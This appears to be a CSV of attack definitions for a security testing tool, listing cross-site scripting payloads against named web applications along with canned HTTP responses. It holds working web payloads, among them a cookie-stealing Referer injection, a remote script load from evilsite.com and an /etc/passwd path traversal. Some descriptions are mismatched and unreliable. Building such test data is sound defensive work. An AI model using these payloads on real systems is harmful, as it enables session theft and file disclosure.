XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.0 200 OK||0D 0A ||Date||3A || Wed, 20 Apr 2005 20||3A ||50||3A ||27 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)                   <script>alert('1mp3rfectp3wns')||3B ||</script>||0D 0A ||Last-Modified||3A || Wed, 20 Apr 2005 20||3A ||49||3A ||14 GMT||0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<HTML><BODY><A href='http||3A ||//google.com'>TEST</a></Body></html>||0D 0A||"
﻿absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,GET /gallery.asp?action=viewimage&categoryid=8&text=&imageid=43&box=&shownew='><script>('XSS')</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Msnbot/2.4||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,GET /project/about/%3Cscript%3Ealert('XSS')||3B ||%3C/script%3E HTTP/1.0||0D 0A 0D 0A||
antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//www.example.com||22 ||onMouseOver='window.location=this.href+document.cookie'||0A 0A 0A||
awstatsXSS.xml,AWStats Referer XSS,"This threat sends a crafted HTTP Request with the referrer field containing a double quote "".  This double quote is escaped in C fashion when displayed on page, allowing an event handle to be created inside of the hyperlink.   This threat will specifically attempt to forward cookie information to example.com.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,GET /visitenkarte.php?user=%22%3E%3Cscript%3Ealert(1)||3B ||%3C/script%3E HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
b1gbb_xss.xml,B1GBB Visitenkarte.PHP Cross Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in ColdFusion Fusebox. This can allow an attacker to steal session and cookie information. B1GBB is a web application, and will typically listen on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,GET /vscal/index.php?page=showlisting&lid=<SCRIPT%20SRC=evilsite.com//xss.js></SCRIPT> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
babykatie_vsreal_xss.xml,ScriptsEZ Easy Ad-Manager Details.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. Easy Ad-Manager is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,GET /blur/index.php?shard=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.0||0D 0A ||Host||3A || www.owned.com||0D 0A ||User-Agent||3A || Googlebot/2
blur6ex_xss.xml,Blursoft Blur6ex Cross-site scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. Blur6ex is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,GET /cn/upload.php?path=||22 ||><script>alert(||22 ||xss||22 ||)</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
contentnow_xss.xml,ContentNow 1.30 (upload/xss) Cross-site Scripting Vulnerability,This threat sends a crafted URL that contains a malicious script which is then executed by the server. ContentNow is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿contrexx_XSS_injection.xml,Contrexx Cross Site Scripting Attack,"This attack uses a XSS flaw in the Contrexx CMS.  This allows arbitrary injection of Javascript into the viewable page, allowing an attacker to steal session, password, and other personal information from the end user.  Contrexx is a PHP web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/mode.php?admin_mode=1&referer=javascript||3A ||alert  HTTP 1.0||0D 0A 0D 0A||
coppermine_xss.xml,Coppermine <= 1.4.12 Cross Site Scripting ,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,GET /cpg/viewlog.php?log=../../../../../../../../../etc/passwd%00  HTTP 1.0||0D 0A 0D 0A||
coppermine_xss_b.xml,Coppermine <= 1.4.12 Cross Site Scripting and Local File Inclusion,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Coppermine is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,GET /store/admin/filemanager/preview.php?file=||22 ||><script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
cubecart_xss.xml,CubeCart Cross-site Scripting Vulnerability,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the
script is inserted into the page with no checking. CubeCart is a web application that typically listens on
port 80",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
